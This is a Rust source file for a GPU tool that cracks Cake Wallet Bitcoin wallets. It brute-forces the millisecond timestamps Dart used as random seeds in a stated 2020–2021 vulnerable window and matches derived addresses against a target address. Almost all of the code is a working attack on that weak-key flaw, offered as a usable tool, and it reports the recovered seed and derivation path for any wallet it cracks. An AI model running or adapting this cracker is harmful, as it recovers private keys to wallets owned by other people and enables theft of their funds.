//! Cake Wallet GPU Cracker
//!
//! Two scan modes:
//!
//! 1. `run_crack(address)` — legacy 32-bit index scan (kept for reference).
//!    This will NOT find real Cake Wallet keys because real seeds are 64-bit
//!    microsecond timestamps (~1.6e15), far outside [0, 2^32).
//!
//! 2. `run_crack_timestamp(address)` — correct mode. Iterates millisecond
//!    timestamps in the known vulnerable window (2020-01-01 .. 2021-05-01),
//!    converts each to microseconds (the value Dart actually used as seed),
//!    and checks 40 derived P2WPKH addresses per timestamp.

#[cfg(not(feature = "gpu"))]
pub fn run_crack(_target_address: &str) -> anyhow::Result<()> {
    anyhow::bail!("Requires GPU. Recompile with --features gpu")
}

#[cfg(not(feature = "gpu"))]
pub fn run_crack_timestamp(_target_address: &str) -> anyhow::Result<()> {
    anyhow::bail!("Requires GPU. Recompile with --features gpu")
}

/// Decode a Bitcoin address (bc1q or Base58) to its 20-byte Hash160.
#[cfg(feature = "gpu")]
fn decode_address_h160(target_address: &str) -> anyhow::Result<[u8; 20]> {
    if target_address.starts_with("bc1q") {
        use bitcoin::Address;
        use std::str::FromStr;
        let addr =
            Address::from_str(target_address)?.require_network(bitcoin::Network::Bitcoin)?;
        let witness = addr
            .witness_program()
            .ok_or_else(|| anyhow::anyhow!("Not a witness address"))?;
        let prog = witness.program();
        if prog.len() != 20 {
            anyhow::bail!("Witness program must be 20 bytes (P2WPKH), got {}", prog.len());
        }
        let mut h160 = [0u8; 20];
        h160.copy_from_slice(prog.as_bytes());
        Ok(h160)
    } else {
        let bytes = bs58::decode(target_address).into_vec()?;
        if bytes.len() != 25 {
            anyhow::bail!("Invalid Base58 address length: {}", bytes.len());
        }
        Ok(bytes[1..21].try_into()?)
    }
}

// --- Mode 1: legacy 32-bit index scan (wrong keyspace, kept for reference) ---

#[cfg(feature = "gpu")]
pub fn run_crack(target_address: &str) -> anyhow::Result<()> {
    use crate::scans::gpu_solver::GpuSolver;
    use tracing::{info, warn};

    info!("Cake Wallet GPU Cracker (32-bit index mode - legacy)");
    info!("NOTE: This mode will NOT find real Cake Wallet keys.");
    info!("      Use run_crack_timestamp() for the correct search.");
    info!("Target: {}", target_address);

    let target_h160 = decode_address_h160(target_address)?;
    info!("Target Hash160: {}", hex::encode(target_h160));

    let solver = GpuSolver::new()?;
    let total_seeds = 0xFFFF_FFFFu32;
    let batch_size: u32 = 1 << 24;

    let mut found = false;
    let mut offset = 0u32;

    while offset < total_seeds {
        let count = std::cmp::min(batch_size, total_seeds - offset);
        let hits = solver.compute_cake_wallet_crack_ms(offset.into(), count, &target_h160)?;

        for (seed_idx, change, addr_idx) in hits {
            found = true;
            warn!("!!! FOUND !!! seed={} m/0'/{}/{}", seed_idx, change, addr_idx);
        }

        offset = offset.saturating_add(count);
        if offset % (batch_size * 4) == 0 {
            info!("Progress: {:.1}%", offset as f64 / total_seeds as f64 * 100.0);
        }
    }

    if !found {
        info!("No match in 32-bit keyspace (expected - use run_crack_timestamp).");
    }
    Ok(())
}

// --- Mode 2: correct timestamp-based scan ------------------------------------

#[cfg(feature = "gpu")]
pub fn run_crack_timestamp(target_address: &str) -> anyhow::Result<()> {
    use crate::scans::gpu_solver::GpuSolver;
    use tracing::{info, warn};

    info!("Cake Wallet GPU Cracker (timestamp mode)");
    info!("Target: {}", target_address);

    let target_h160 = decode_address_h160(target_address)?;
    info!("Target Hash160: {}", hex::encode(target_h160));

    let solver = GpuSolver::new()?;

    // Known vulnerable window: 2020-01-01 .. 2021-05-01 UTC in milliseconds.
    // Android/iOS DateTime.now().microsecondsSinceEpoch usually has ms precision,
    // so iterating ms steps and multiplying by 1000 covers the full space.
    let start_ms: u64 = 1_577_836_800_000;
    let end_ms:   u64 = 1_619_913_600_000;
    let total_ms = end_ms - start_ms;

    info!(
        "Window: {} ms .. {} ms ({} ms total, ~{:.1} days)",
        start_ms, end_ms, total_ms,
        total_ms as f64 / 86_400_000.0
    );

    let batch_size: u64 = 1 << 24; // 4M timestamps per GPU batch
    let mut offset_ms: u64 = 0;
    let mut found = false;

    while offset_ms < total_ms {
        let count = std::cmp::min(batch_size, total_ms - offset_ms) as u32;
        let batch_start_ms = start_ms + offset_ms;

        let hits = solver.compute_cake_wallet_crack_ms(batch_start_ms, count, &target_h160)?;

        for (ts_ms, change, addr_idx) in hits {
            found = true;
            warn!("!!! FOUND MATCH !!!");
            warn!("  Timestamp ms : {}", ts_ms);
            warn!("  Timestamp us : {}", ts_ms * 1000);
            warn!("  Derivation   : m/0'/{}/{}", change, addr_idx);
        }

        offset_ms += count as u64;

        if offset_ms % (batch_size * 16) == 0 {
            info!(
                "Progress: {:.2}%  ({}/{} ms)",
                offset_ms as f64 / total_ms as f64 * 100.0,
                offset_ms, total_ms
            );
        }
    }

    if !found {
        info!("No match found in the 2020-2021 vulnerable window.");
        info!("If wallet was created outside this range, adjust start_ms/end_ms.");
    }
    Ok(())
}